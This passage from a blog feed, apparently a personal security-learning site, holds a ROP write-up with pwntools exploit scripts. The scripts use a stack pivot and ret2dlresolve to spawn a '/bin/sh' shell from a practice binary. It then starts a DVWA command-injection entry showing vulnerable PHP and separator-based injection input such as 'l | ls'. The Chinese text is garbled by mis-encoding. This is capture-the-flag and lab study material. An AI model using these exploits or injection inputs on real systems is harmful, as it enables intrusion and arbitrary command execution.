class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&quot;./test&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./test&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/gstalker/buu/libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">bss = <span class="number">0x0804a020</span></span><br><span class="line">offset = <span class="number">0x200</span></span><br><span class="line">stack = bss + offset</span><br><span class="line">leave_ret = <span class="number">0x08048458</span></span><br><span class="line">main = <span class="number">0x0804845A</span></span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">ppp_ret = <span class="number">0x080484f9</span></span><br><span class="line">pop_ebp = <span class="number">0x080484fb</span></span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">plt0 = <span class="number">0x080482F0</span></span><br><span class="line">rel_plt = <span class="number">0x080482b0</span></span><br><span class="line">dynsym = <span class="number">0x080481cc</span></span><br><span class="line">dynstr = <span class="number">0x0804822C</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>(<span class="params">command = <span class="string">&quot;&quot;</span></span>):</span></span><br><span class="line">    gdb.attach(sh,command)</span><br><span class="line">    <span class="built_in">input</span>()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">borrowStack</span>():</span></span><br><span class="line">    junk = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x28</span></span><br><span class="line">    payload = junk + p32(bss + offset)</span><br><span class="line">    payload += p32(read_plt) + p32(ppp_ret) </span><br><span class="line">    payload += p32(<span class="number">0</span>) + p32(bss + offset) + p32(<span class="number">0x200</span>)</span><br><span class="line">    payload += p32(pop_ebp) + p32(bss + offset) + p32(leave_ret)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;vuln&quot;</span>)</span><br><span class="line">    sh.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">over1</span>():</span></span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x4</span></span><br><span class="line">    payload += p32(write) + p32(main)</span><br><span class="line">    payload += p32(<span class="number">1</span>) + p32(bss + offset + <span class="number">0x80</span>) + p32(<span class="number">0x8</span>)</span><br><span class="line">    payload = payload.ljust(<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    payload += <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">    payload = payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    sh.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">over2</span>():</span></span><br><span class="line">    write_index = (write - plt0) / <span class="number">16</span> - <span class="number">1</span></span><br><span class="line">    write_index *= <span class="number">8</span></span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">4</span></span><br><span class="line">    payload += p32(plt0)</span><br><span class="line">    payload += p32(<span class="built_in">int</span>(write_index)) + p32(<span class="number">0xdead</span>)</span><br><span class="line">    payload += p32(<span class="number">1</span>) + p32(bss + offset + <span class="number">0x80</span>) + p32(<span class="number">0x8</span>)</span><br><span class="line">    payload = payload.ljust(<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    payload += <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">    payload = payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    sh.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">over3</span>():</span></span><br><span class="line">    r_info = <span class="number">0x407</span></span><br><span class="line">    index_offset = (stack + <span class="number">28</span> - rel_plt)</span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">4</span></span><br><span class="line">    payload += p32(plt0)</span><br><span class="line">    payload += p32(<span class="built_in">int</span>(index_offset)) + p32(<span class="number">0xdead</span>)</span><br><span class="line">    payload += p32(<span class="number">1</span>) + p32(bss + offset + <span class="number">0x80</span>) + p32(<span class="number">0x8</span>)</span><br><span class="line">    payload += p32(write_got) + p32(r_info)</span><br><span class="line">    payload = payload.ljust(<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    payload += <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">    payload = payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    sh.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">over4</span>():</span></span><br><span class="line">    fake_sym_addr = stack + <span class="number">0x24</span></span><br><span class="line">    fake_sym = p32(<span class="number">0x31</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x12</span>)</span><br><span class="line">    align = <span class="number">0x10</span> - ((fake_sym_addr - dynsym) &amp; <span class="number">0xf</span>) </span><br><span class="line">    <span class="comment"># why align ????????</span></span><br><span class="line">    fake_sym_addr = fake_sym_addr + align</span><br><span class="line">    index_fake_sym = <span class="built_in">int</span>((fake_sym_addr - dynsym) / <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">    index_offset = stack + <span class="number">28</span> - rel_plt</span><br><span class="line">    r_info = (index_fake_sym &lt;&lt; <span class="number">8</span>) + <span class="number">0x7</span></span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">4</span></span><br><span class="line">    payload += p32(plt0)</span><br><span class="line">    payload += p32(<span class="built_in">int</span>(index_offset)) + p32(<span class="number">0xdead</span>)</span><br><span class="line">    payload += p32(<span class="number">1</span>) + p32(bss + offset + <span class="number">0x80</span>) + p32(<span class="number">0x8</span>)</span><br><span class="line">    payload += p32(write_got) + p32(r_info)</span><br><span class="line">    payload += <span class="string">b&#x27;a&#x27;</span> * align</span><br><span class="line">    payload += fake_sym</span><br><span class="line">    payload = payload.ljust(<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    payload += <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">    payload = payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    sh.send(payload)    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">over5</span>():</span></span><br><span class="line"></span><br><span class="line">    fake_sym_addr = stack + <span class="number">0x24</span></span><br><span class="line">    align = <span class="number">0x10</span> - ((fake_sym_addr - dynsym) &amp; <span class="number">0xf</span>) </span><br><span class="line">    <span class="comment"># why align ????????</span></span><br><span class="line">    fake_sym_addr = fake_sym_addr + align</span><br><span class="line">    fake_str_addr = fake_sym_addr - dynstr + <span class="number">0x10</span> </span><br><span class="line">    <span class="comment"># make the fake dynstr table below the dynsym table</span></span><br><span class="line">    <span class="comment"># 0x10 is the size of struct (offfset 0 0 0x12)</span></span><br><span class="line">    index_fake_sym = <span class="built_in">int</span>((fake_sym_addr - dynsym) / <span class="number">16</span>)</span><br><span class="line">    fake_sym = p32(fake_str_addr) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x12</span>)</span><br><span class="line"></span><br><span class="line">    index_offset = stack + <span class="number">28</span> - rel_plt</span><br><span class="line">    r_info = (index_fake_sym &lt;&lt; <span class="number">8</span>) + <span class="number">0x7</span></span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">4</span></span><br><span class="line">    payload += p32(plt0)</span><br><span class="line">    payload += p32(<span class="built_in">int</span>(index_offset)) + p32(<span class="number">0xdead</span>)</span><br><span class="line">    payload += p32(<span class="number">1</span>) + p32(bss + offset + <span class="number">0x80</span>) + p32(<span class="number">0x8</span>)</span><br><span class="line">    payload += p32(write_got) + p32(r_info)</span><br><span class="line">    payload += <span class="string">b&#x27;a&#x27;</span> * align</span><br><span class="line">    payload += fake_sym</span><br><span class="line">    payload += <span class="string">b&#x27;write\x00&#x27;</span></span><br><span class="line">    payload = payload.ljust(<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    payload += <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">    payload = payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    sh.send(payload)   </span><br><span class="line">COPY</span><br></pre></td></tr></table></figure><h4 id="stage6"><a href="#stage6" class="headerlink" title="stage6"></a>stage6</h4><p>åªéœ€è¦åœ¨ <a href="http://ethushiroha.com/?p=869#stage5">stage5</a> çš„åŸºç¡€ä¸Šä¿®æ”¹ <code>dynstr</code> çš„å€¼å’Œå‚æ•°å°±å¯ä»¥äº†</p><p><strong>æ³¨: æˆ‘åœ¨ä¸€å¼€å§‹ç›´æ¥æ”¹çš„æ—¶å€™å‘ç°ç›´æ¥ <code>EOF</code> äº†, æ‰€ä»¥è°ƒæ•´æ ˆè¿ç§»ä¹‹åçš„å¤§å°ä¸º <code>0x500</code> è¿™æ ·å°±ä¸æŠ¥é”™äº†(ç†ç”±æš‚ä¸”æœªçŸ¥)</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&quot;./test&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./test&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/gstalker/buu/libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">bss = <span class="number">0x0804a020</span></span><br><span class="line">offset = <span class="number">0x500</span></span><br><span class="line">stack = bss + offset</span><br><span class="line">leave_ret = <span class="number">0x08048458</span></span><br><span class="line">main = <span class="number">0x0804845A</span></span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">ppp_ret = <span class="number">0x080484f9</span></span><br><span class="line">pop_ebp = <span class="number">0x080484fb</span></span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">plt0 = <span class="number">0x080482F0</span></span><br><span class="line">rel_plt = <span class="number">0x080482b0</span></span><br><span class="line">dynsym = <span class="number">0x080481cc</span></span><br><span class="line">dynstr = <span class="number">0x0804822C</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>(<span class="params">command = <span class="string">&quot;&quot;</span></span>):</span></span><br><span class="line">    gdb.attach(sh,command)</span><br><span class="line">    <span class="built_in">input</span>()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">borrowStack</span>():</span></span><br><span class="line">    junk = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x28</span></span><br><span class="line">    payload = junk + p32(bss + offset)</span><br><span class="line">    payload += p32(read_plt) + p32(ppp_ret) </span><br><span class="line">    payload += p32(<span class="number">0</span>) + p32(bss + offset) + p32(<span class="number">0x100</span>)</span><br><span class="line">    payload += p32(pop_ebp) + p32(bss + offset) + p32(leave_ret)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;vuln&quot;</span>)</span><br><span class="line">    sh.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">over1</span>():</span></span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x4</span></span><br><span class="line">    payload += p32(write) + p32(main)</span><br><span class="line">    payload += p32(<span class="number">1</span>) + p32(bss + offset + <span class="number">0x80</span>) + p32(<span class="number">0x8</span>)</span><br><span class="line">    payload = payload.ljust(<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    payload += <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">    payload = payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    sh.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">over2</span>():</span></span><br><span class="line">    write_index = (write - plt0) / <span class="number">16</span> - <span class="number">1</span></span><br><span class="line">    write_index *= <span class="number">8</span></span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">4</span></span><br><span class="line">    payload += p32(plt0)</span><br><span class="line">    payload += p32(<span class="built_in">int</span>(write_index)) + p32(<span class="number">0xdead</span>)</span><br><span class="line">    payload += p32(<span class="number">1</span>) + p32(bss + offset + <span class="number">0x80</span>) + p32(<span class="number">0x8</span>)</span><br><span class="line">    payload = payload.ljust(<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    payload += <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">    payload = payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    sh.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">over3</span>():</span></span><br><span class="line">    r_info = <span class="number">0x407</span></span><br><span class="line">    index_offset = (stack + <span class="number">28</span> - rel_plt)</span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">4</span></span><br><span class="line">    payload += p32(plt0)</span><br><span class="line">    payload += p32(<span class="built_in">int</span>(index_offset)) + p32(<span class="number">0xdead</span>)</span><br><span class="line">    payload += p32(<span class="number">1</span>) + p32(bss + offset + <span class="number">0x80</span>) + p32(<span class="number">0x8</span>)</span><br><span class="line">    payload += p32(write_got) + p32(r_info)</span><br><span class="line">    payload = payload.ljust(<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    payload += <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">    payload = payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    sh.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">over4</span>():</span></span><br><span class="line">    fake_sym_addr = stack + <span class="number">0x24</span></span><br><span class="line">    fake_sym = p32(<span class="number">0x31</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x12</span>)</span><br><span class="line">    align = <span class="number">0x10</span> - ((fake_sym_addr - dynsym) &amp; <span class="number">0xf</span>) </span><br><span class="line">    <span class="comment"># why align ????????</span></span><br><span class="line">    fake_sym_addr = fake_sym_addr + align</span><br><span class="line">    index_fake_sym = <span class="built_in">int</span>((fake_sym_addr - dynsym) / <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">    index_offset = stack + <span class="number">28</span> - rel_plt</span><br><span class="line">    r_info = (index_fake_sym &lt;&lt; <span class="number">8</span>) + <span class="number">0x7</span></span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">4</span></span><br><span class="line">    payload += p32(plt0)</span><br><span class="line">    payload += p32(<span class="built_in">int</span>(index_offset)) + p32(<span class="number">0xdead</span>)</span><br><span class="line">    payload += p32(<span class="number">1</span>) + p32(bss + offset + <span class="number">0x80</span>) + p32(<span class="number">0x8</span>)</span><br><span class="line">    payload += p32(write_got) + p32(r_info)</span><br><span class="line">    payload += <span class="string">b&#x27;a&#x27;</span> * align</span><br><span class="line">    payload += fake_sym</span><br><span class="line">    payload = payload.ljust(<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    payload += <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">    payload = payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    sh.send(payload)    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">over5</span>():</span></span><br><span class="line">    fake_sym_addr = stack + <span class="number">0x24</span></span><br><span class="line">    align = <span class="number">0x10</span> - ((fake_sym_addr - dynsym) &amp; <span class="number">0xf</span>) </span><br><span class="line">    <span class="comment"># why align ????????</span></span><br><span class="line">    fake_sym_addr = fake_sym_addr + align</span><br><span class="line">    fake_str_addr = fake_sym_addr - dynstr + <span class="number">0x10</span> </span><br><span class="line">    <span class="comment"># 0x10 is the size of struct (offfset 0 0 0x12)</span></span><br><span class="line">    index_fake_sym = <span class="built_in">int</span>((fake_sym_addr - dynsym) / <span class="number">16</span>)</span><br><span class="line">    fake_sym = p32(fake_str_addr) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x12</span>)</span><br><span class="line"></span><br><span class="line">    index_offset = stack + <span class="number">28</span> - rel_plt</span><br><span class="line">    r_info = (index_fake_sym &lt;&lt; <span class="number">8</span>) + <span class="number">0x7</span></span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">4</span></span><br><span class="line">    payload += p32(plt0)</span><br><span class="line">    payload += p32(<span class="built_in">int</span>(index_offset)) + p32(<span class="number">0xdead</span>)</span><br><span class="line">    payload += p32(<span class="number">1</span>) + p32(bss + offset + <span class="number">0x80</span>) + p32(<span class="number">0x8</span>)</span><br><span class="line">    payload += p32(write_got) + p32(r_info)</span><br><span class="line">    payload += <span class="string">b&#x27;a&#x27;</span> * align</span><br><span class="line">    payload += fake_sym</span><br><span class="line">    payload += <span class="string">b&#x27;write\x00&#x27;</span></span><br><span class="line">    payload = payload.ljust(<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    payload += <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">    payload = payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    sh.send(payload)   </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">over6</span>():</span></span><br><span class="line">    fake_sym_addr = stack + <span class="number">0x24</span></span><br><span class="line">    align = <span class="number">0x10</span> - ((fake_sym_addr - dynsym) &amp; <span class="number">0xf</span>) </span><br><span class="line">    <span class="comment"># why align ????????</span></span><br><span class="line">    fake_sym_addr = fake_sym_addr + align</span><br><span class="line">    fake_str_addr = fake_sym_addr - dynstr + <span class="number">0x10</span> </span><br><span class="line">    <span class="comment"># 0x10 is the size of struct (offfset 0 0 0x12)</span></span><br><span class="line">    index_fake_sym = <span class="built_in">int</span>((fake_sym_addr - dynsym) / <span class="number">16</span>)</span><br><span class="line">    fake_sym = p32(fake_str_addr) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x12</span>)</span><br><span class="line"></span><br><span class="line">    index_offset = stack + <span class="number">28</span> - rel_plt</span><br><span class="line">    r_info = (index_fake_sym &lt;&lt; <span class="number">8</span>) + <span class="number">0x7</span></span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">4</span></span><br><span class="line">    payload += p32(plt0)</span><br><span class="line">    payload += p32(<span class="built_in">int</span>(index_offset)) + p32(main)</span><br><span class="line">    payload += p32(stack + <span class="number">0x80</span>)</span><br><span class="line">    payload += p32(stack + <span class="number">0x80</span>) + p32(<span class="number">8</span>)</span><br><span class="line">    payload += p32(write_got) + p32(r_info)</span><br><span class="line">    payload += <span class="string">b&#x27;a&#x27;</span> * align <span class="comment"># padding</span></span><br><span class="line">    payload += fake_sym</span><br><span class="line">    payload += <span class="string">b&#x27;system\x00&#x27;</span></span><br><span class="line">    payload = payload.ljust(<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    payload += <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">    payload = payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    <span class="comment">#dbg(&quot;b *&#123;&#125;&quot;.format(plt0))</span></span><br><span class="line">    sh.send(payload)   COPY</span><br></pre></td></tr></table></figure><h3 id="ç†è§£"><a href="#ç†è§£" class="headerlink" title="ç†è§£"></a>ç†è§£</h3><p>ç›®å‰ ä¸æ‡‚çš„åœ°æ–¹å°±æ˜¯ <code>align</code> å˜é‡äº†,éš¾ä¸æˆæ˜¯ä¸ºäº†å­—èŠ‚å¯¹é½?</p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
          <category> ROP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> ROP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>dvwa-command-injection</title>
      <link href="/command-injection.html"/>
      <url>/command-injection.html</url>
      
        <content type="html"><![CDATA[<p>dvwaé¶åœºçš„å‘½ä»¤æ³¨å…¥éƒ¨åˆ†</p><a id="more"></a><h2 id="low"><a href="#low" class="headerlink" title="low"></a>low</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$target</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;ip&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">    <span class="keyword">if</span>( stristr( php_uname( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Windows</span></span><br><span class="line">        <span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// *nix</span></span><br><span class="line">        <span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  -c 4 &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for the end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">                                </span><br></pre></td></tr></table></figure><p><img src="./dvwa-command-injection/command-injection_low1.png" alt="img"></p><p><img src="./dvwa-command-injection/command-injection_low2.png" alt="img"></p><p>ç”±äºå‘½ä»¤æ‰§è¡Œçš„æ—¶å€™æ²¡æœ‰å¯¹è¾“å…¥åšæ£€æµ‹ï¼Œä½¿ç”¨ä¸€äº›ç‰¹æ®Šçš„ç¬¦å·å¯ä»¥ç»•è¿‡ã€‚<br>æœ€ç®€å•çš„å¯ä»¥ä½¿ç”¨ <code>; | &amp;&amp; &amp;</code> ç»•è¿‡ã€‚ä¾‹å¦‚è¾“å…¥<code>l | ls</code><br>æ­¤æ—¶å‘½ä»¤ä¼šå˜æˆ <code>ping l | ls</code>lsæŒ‡ä»¤ä¹Ÿä¼šè¢«æ‰§è¡Œã€‚</p><p>æ³¨ï¼š<code>;``|</code>æ˜¯Linuxç»ˆç«¯å‘½ä»¤çš„åˆ†éš”ç¬¦</p><h2 id="middle"><a href="#middle" class="headerlink" title="middle"></a>middle</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span 